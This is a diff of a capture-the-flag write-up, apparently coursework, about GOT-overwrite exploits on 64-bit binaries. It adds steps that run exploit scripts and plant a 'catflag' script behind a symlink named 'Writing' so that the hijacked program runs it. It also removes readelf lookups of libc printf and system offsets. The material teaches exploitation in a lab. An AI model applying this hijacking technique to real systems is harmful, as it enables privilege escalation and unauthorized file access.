@@ -16,6 +16,8 @@ overwrite got and run your function.
 
 ### Exploit1
 
+Run the script.
+
 ```bash
 ./0-aw0-64.py
 ```
@@ -31,14 +33,27 @@ the program took care of setreguid() for you.
 
 ### Exploit2
 
+Edit `catflag`
+
 ```bash
-TXK220008@ctf-vm1:~/unit3/1-aw-64$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "13 printf@@GLIBC_2.2.5$"
-   603: 0000000000055810   161 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5
-TXK220008@ctf-vm1:~/unit3/1-aw-64$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system@@GLIBC_2.2.5$"
-  1351: 00000000000453a0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+vim catflag
 ```
 
-diff `66672`
+like this.
+
+```sh
+#!/bin/sh
+cat flag
+```
+
+Create a symbolic link so that it will be called.
+
+```bash
+chmod +x catflag
+ln -s catflag Writing
+```
+
+Run the script.
 
 ```bash
 ./1-aw-64.py
